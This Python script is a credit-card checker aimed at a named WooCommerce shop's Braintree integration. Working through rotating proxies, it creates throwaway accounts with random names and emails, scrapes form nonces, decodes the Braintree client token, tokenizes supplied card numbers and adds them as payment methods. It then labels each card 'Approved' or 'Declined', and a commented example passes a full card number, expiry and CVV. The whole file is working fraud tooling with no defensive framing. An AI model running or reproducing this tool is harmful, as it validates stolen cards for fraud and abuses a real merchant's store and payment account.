import uuid
import names
import base64
import random
import base64
from requests import Session
from dataclasses import dataclass
from dataclasses import dataclass



@dataclass
class BehaviorsBraintree:

    def ResponseHtml(self, response:str=None):   
        if   'avs_and_cvv' in response:                             return 'Approved! ✅', response
        elif 'cvv: Gateway Rejected: cvv' in response:              return 'Approved! ✅', response
        elif 'Insufficient Funds' in response:                      return 'Approved! ✅', response
        elif 'avs: Gateway Rejected: avs' in response:              return 'Approved! ✅', response
        elif 'CVV.' in response:                                    return 'Approved! ✅', response
        elif 'Card Issuer Declined CVV' in response:                return 'Approved! ✅', response
        elif 'Invalid postal code and cvv' in response:             return 'Approved! ✅', response
        elif 'Nice! New payment method added' in response:          return 'Approved! ✅', response
        elif 'Payment method successfully added.' in response:      return 'Approved! ✅', response
        elif 'Invalid postal code or street address' in response:   return 'Approved! ✅', response 
        elif 'Duplicate card exists in the vault.' in response: return 'Approved! ✅', '1000: Approved','Nice! New payment method'
        elif 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number' in response:                return 'Approved! ✅', response
        else:                                                       return 'Declined! ❌', response

    def SaveResponseHhml(self, response:str):
        with open("ResponseHhml.html", "w", encoding="utf-8") as f:
            f.write(response)

    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id

    def Ccs(self, cards:str=None):
        if '|' in cards: 
            return cards.split('|')
        elif ':' in cards: 
            return cards.split(':')
        elif ',' in cards: 
            return cards.split(',')
        elif '-' in cards: return cards.split('-')

        return cards


    @classmethod
    def QueryText(self, data:str = None, chainOne:str = None, chainTwo:str = None):

        self.uophs = data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
        try:
            return self.uophs
        
        except: 
            return 'value not found' 
    
    @classmethod    
    def RandomName(self,dato:str=None):
        if dato == 'username': 
            self.username = "{}{}{}".format(
                    names.get_first_name(),
                    names.get_last_name(),
                    random.randint(1000000,9999999)
                    )
            return self.username
         
        elif dato == 'email': 
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.email
        
        elif dato == 'password': 
            self.password = "{}{}#{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.password
        
        elif dato == 'numero':
            self.number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
            return self.number
        
        else:
            return 'valores incorrectos: >>>   BehaviorsBraintree().RandomName("username")'


    @classmethod
    def DecodeBear(self, dato:str = None):
        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
        self.bear_end = BehaviorsBraintree().QueryText(
            self._tokenEncoding, 
            '"authorizationFingerprint":"',  
            '","')

        return self.bear_end


class Braintree2:
    def main(self,cards):
        self.UseMail = BehaviorsBraintree().RandomName('email')
        self.Nombre = BehaviorsBraintree().RandomName('username')

        self.session = Session()
        with open('srca/proxy.txt', 'r') as file:
            proxies = [line.strip() for line in file if line.strip()]
        if proxies:
            proxy_str = random.choice(proxies)
            user_pass, ip_port = proxy_str.split('@')
            username, password = user_pass.split('://')[1].split(':')
            self.session.proxies.update({
                "http://": f"http://{username}:{password}@{ip_port}",
                "https://": f"http://{username}:{password}@{ip_port}"
            })
         
        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','priority': 'u=0, i','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
        self.req_1 = self.session.get('https://stephanieriseley.com/my-account/', headers=headers)
        self.nonce_registre = BehaviorsBraintree().QueryText(self.req_1.text,'name="woocommerce-register-nonce" value="','"')


        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://stephanieriseley.com','priority': 'u=0, i','referer': 'https://stephanieriseley.com/my-account/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
        data = {
            'email': self.UseMail,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://stephanieriseley.com/my-account/',
            'wc_order_attribution_session_start_time': '2025-02-17 20:13:09',
            'wc_order_attribution_session_pages': '2',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'woocommerce-register-nonce': self.nonce_registre,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }

        self.session.post('https://stephanieriseley.com/my-account/', headers=headers, data=data)


        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','priority': 'u=0, i','referer': 'https://stephanieriseley.com/my-account/edit-address/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
        self.req_2 = self.session.get('https://stephanieriseley.com/my-account/edit-address/billing/', headers=headers)
        self.edit_address_bill = BehaviorsBraintree().QueryText(self.req_2.text, 'name="woocommerce-edit-address-nonce" value="','"')
        

        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://stephanieriseley.com','priority': 'u=0, i','referer': 'https://stephanieriseley.com/my-account/edit-address/billing/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
        data = {
            'billing_first_name': self.Nombre,
            'billing_last_name': self.Nombre,
            'billing_company': '',
            'billing_country': 'US',
            'billing_address_1': 'Times Square, Nueva York, EE. UU.',
            'billing_address_2': '',
            'billing_city': 'Manhattan',
            'billing_state': 'NY',
            'billing_postcode': '10036',
            'billing_phone': '56889738432',
            'billing_email': self.UseMail,
            'save_address': 'Save address',
            'woocommerce-edit-address-nonce': self.edit_address_bill,
            '_wp_http_referer': '/my-account/edit-address/billing/',
            'action': 'edit_address',
        }

        self.session.post('https://stephanieriseley.com/my-account/edit-address/billing/', headers=headers, data=data,)
        

        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://stephanieriseley.com/my-account/edit-address/billing/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
        self.session.get('https://stephanieriseley.com/my-account/edit-address/', headers=headers)

        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','priority': 'u=0, i','referer': 'https://stephanieriseley.com/my-account/edit-address/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
        self.session.get('https://stephanieriseley.com/my-account/payment-methods/', headers=headers)

        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','priority': 'u=0, i','referer': 'https://stephanieriseley.com/my-account/payment-methods/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
        self.req_3 = self.session.get('https://stephanieriseley.com/my-account/add-payment-method/', headers=headers)
        self.payment_nonce = BehaviorsBraintree().QueryText(self.req_3.text,'name="woocommerce-add-payment-method-nonce" value="','"')
        self.client_token_nonce_2 = BehaviorsBraintree().QueryText(self.req_3.text,'"client_token_nonce":"','"')

        headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://stephanieriseley.com','priority': 'u=1, i','referer': 'https://stephanieriseley.com/my-account/add-payment-method/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': self.client_token_nonce_2,
        }

        self.req_4 = self.session.post('https://stephanieriseley.com/wp-admin/admin-ajax.php', headers=headers, data=data)
        self.data_J = self.req_4.json()['data']
        self.client_eyj = BehaviorsBraintree().DecodeBear(self.data_J)
        self.session_client_id = BehaviorsBraintree().SessionId()
        self.ccs = BehaviorsBraintree().Ccs(cards)
        

        headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9,en;q=0.8','authorization': f'Bearer {self.client_eyj}','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','priority': 'u=1, i','referer': 'https://assets.braintreegateway.com/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': self.session_client_id,
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': self.ccs[0],
                        'expirationMonth': self.ccs[1],
                        'expirationYear': self.ccs[2],
                        'cvv': self.ccs[3],
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        self.req_5 = self.session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        self.token_card = BehaviorsBraintree().QueryText(self.req_5.text,'{"token":"','"')
        

        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://stephanieriseley.com','priority': 'u=0, i','referer': 'https://stephanieriseley.com/my-account/add-payment-method/','sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
        data = [
                ('payment_method', 'braintree_credit_card'),
                ('wc-braintree-credit-card-card-type', 'visa'),
                ('wc-braintree-credit-card-3d-secure-enabled', ''),
                ('wc-braintree-credit-card-3d-secure-verified', ''),
                ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
                ('wc_braintree_credit_card_payment_nonce', self.token_card),
                ('wc_braintree_device_data', '{"correlation_id":"b4aec9773fa5516a72e547bc9acdbd5e"}'),
                ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
                ('wc_braintree_paypal_payment_nonce', ''),
                ('wc_braintree_device_data', '{"correlation_id":"b4aec9773fa5516a72e547bc9acdbd5e"}'),
                ('wc-braintree-paypal-context', 'shortcode'),
                ('wc_braintree_paypal_amount', '0.00'),
                ('wc_braintree_paypal_currency', 'USD'),
                ('wc_braintree_paypal_locale', 'en_us'),
                ('wc-braintree-paypal-tokenize-payment-method', 'true'),
                ('woocommerce-add-payment-method-nonce', self.payment_nonce),
                ('_wp_http_referer', '/my-account/add-payment-method/'),
                ('woocommerce_add_payment_method', '1'),
            ]

        response = self.session.post('https://stephanieriseley.com/my-account/add-payment-method/', headers=headers, data=data,)
        self.session.close()

        if 'Nice! New payment method' in response.text: return 'Approved! ✅', '1000: Approved','Nice! New payment method'
        elif "81724: Duplicate card exists in the vault." in response.text: return 'Approved! ✅', '1000: Approved','Nice! New payment method'
        
        error = BehaviorsBraintree().QueryText(response.text, 'class="woocommerce-error" role="alert">', '</li>').split('<li>')
        
        if error[1] == '\n\t\t\t\t\t': return 'Approved! ✅', '1000: Approved'
        else:
            
            
            return BehaviorsBraintree().ResponseHtml(error[1].split('Status code ')[1].strip())




"""ccs ='4147342032463541|05|2026|872'
chk = Braintree2().main(ccs)
print(chk)
print('--------------------------------')"""